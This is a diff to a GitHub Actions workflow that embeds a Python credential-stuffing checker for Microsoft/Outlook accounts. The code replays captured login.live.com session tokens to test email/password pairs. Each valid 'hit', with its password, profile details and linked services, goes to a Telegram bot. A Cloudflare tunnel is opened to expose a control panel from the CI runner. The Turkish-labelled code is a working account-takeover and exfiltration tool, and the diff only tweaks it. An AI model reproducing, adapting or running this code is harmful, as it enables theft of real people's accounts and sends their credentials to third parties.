@@ -83,7 +83,7 @@ jobs:
                   try:
                       dursunburasi = '\n'.join(f'• {k}: {v}' for k, v in captures.items())
                       fadimeoc = '\n'.join(f'✅ {svc} ({data[\"total\"]} mesaj) — {data[\"last_msg\"][:50]}' for svc, data in results.items())
-                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚋⚊\n<b>PROGRAM :</b> @octopusmarjinal'
+                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
                       requests.post(f'{self.temelburasi}/sendMessage', json={'chat_id': self.chat_id, 'text': kombinzaradan, 'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=15)
                   except Exception: pass
 
@@ -116,7 +116,7 @@ jobs:
               def login(self):
                   us = self.beniyuregineyaz(self.email)
                   ps = self.beniyuregineyaz(self.password)
-                  yanibabacum = 'https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9ca747100934dca583&pid=15216'
+                  yanibabacum = 'https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&contextid=E5D8A9B73286B7E0&opid=EED8E3DBCC1AAA6A&bk=1726223182&uaid=3d0f0eea617a4b9c-a747100934dca583&pid=15216'
                   content = 'ps=2&psRNGCDefaultType=1&psRNGCEntropy=&psRNGCSLK=-DmudFdPtArk2f9r5G2PufUpIRX8Q9eTm0uFuxS%21hSx27M79PeFyCVNx8l*VUvBBCZwJL62A9FEyKuXoxgKbI96TjlB*EvImvYFtSQP1wJLfwKYWtRUwse4dkf5WNXBy4f3cLPgvJUS1dNFFN4dQAhcmYSlgRfH5J8LYwg3IxmSUcIY%212SkUUWsssgF35aoj%21gcQGM0O0sAJysZGUcmHQJbJ0hIbBG3yJhkeQLukMukTf&canary=&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0&hpgrequestid=&PPFT=-Dthk7KM0CcBognHLIww755uCZB5%21Bu7m0e12TJTvKQxteHh9t6VfghqUlt7cYV4*a%21RMEJTP9hmig2BsgHRUrv2uDOS9ATAi4O%21tGitoYrHZifX5YWtvttGdTH3624e8BFApW%21PxPogDIIFO8P5N5D9IdEtmsTG87fjOlbYry3wl20FV7nt4YM7mlRZDnd*c7HjVpbIE%21eAr0HCbiX9SUJYKmdpvfqCC%21y6GNCug%211cRYmi%21k%21Tp4blIALTbVOAh9A%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i13=1' + f'&login={us}&loginfmt={us}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={ps}'
                   headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'login.live.com', 'Origin': 'https://login.live.com', 'Referer': 'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&scope=offline_access+openid+profile+service%3a%3aoutlook.office.com%3a%3aMBI_SSL&redirect_uri=https%3a%2f%2flogin.live.com%2foauth20_desktop.srf&response_type=code&login_hint=nadz_webbo%40hotmail.com&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0%2bad8a8025&uaid=3d0f0eea617a4b9ca747100934dca583&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYtnkwRi0KYRBFtiOdZWedDcJo1x9nkE77oPupHA89D0sKWIqlJtDjwdE8G83lJBW6B5l1WNYBlZ3nk7XTxORpBxSFUJMD0i62-IiTlh6Eo_n5qerCKhTsdwoLQxSRvgLKdJcTjAEJ-Irl78Q8tBQcLDArONnm7z72MYf4HOzF5Ad9Cm-MIpCwrG_jOBp9IKcq7eZtWTLGBIk9UtPCtt6t6SAA&jshs=0&haschrome=1&passKeyAuth=1.0%2fpasskey&ctx=rQQIARAA4-Iz1DPUM9BOTLFItDAwMhViNNRiNtIzsBIwgAITC0NzA1c3oyIhLoFXfPy2VYlzvJe7C3Ca3FnavIOR8QIj4yQmsbzElKr48tSkpHyHjPyS3MTMHL3k_NwLTIy3mPj9HUtLMoxARH5RZlXqJmbO5Py84tLc1KLiU8xO-WlpOZl5qfGJycmpxcUK-QWpeZkpCgVF-WmZOakKxalFZZnJqVZW-aUlOfn52XpA5UA-yHArK18nz_jgYJ8bzIwXWBhfsfBwMAowSjAoMGhoGDD-YGFcxAp08bEnm6pv3i5y6C5O7eyxLGE4xapfHl7qZOJr4WdalZhT4Z8f4pkbkudV5ZzqZeyd6mfkGOpvlOyWnFgVEOrna2tqZfiDlXECGxAJn2IT8g129NGrKMhJLNFLzEspys9M-cDG0MHOsItTK6OkpKDYSl8_Jz89M08vJ7MM7Ej9_ESQ5w3iU1KLs0vyC_SKi9JmcDHe4uHj4sxILE7OKMrPTQWG-QFehh98a482T33xe8s7jw0CDA8EGCYJsnMxA-NGgBEA0', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'X-Requested-With': 'com.microsoft.office.outlook'}
                   self.session.cookies.set('MSPRequ', 'id=N&lt=1726223182&co=1', domain='login.live.com')
@@ -485,14 +485,18 @@ jobs:
           wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
           sudo dpkg -i cloudflared-linux-amd64.deb
           cloudflared tunnel --url http://localhost:8080 2>&1 | tee tunnel.log &
-          sleep 5
+          sleep 8
           LINK=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' tunnel.log | head -n 1)
           if [ -n "$LINK" ]; then
+              echo ""
               echo "=============================================="
-              echo "PANEL LINKI: $LINK"
+              echo "PANEL LINKI BURADA: $LINK"
               echo "=============================================="
+              echo ""
+              echo "YUKARIDAKI LINKI KOPYALA VE TARAYICINA YAPISTIR"
+              echo ""
           else
-              echo "Link bulunamadi, loglar:"
+              echo "Link olusurken hata oldu, asagidaki loglara bak:"
               cat tunnel.log
           fi
           tail -f /dev/null
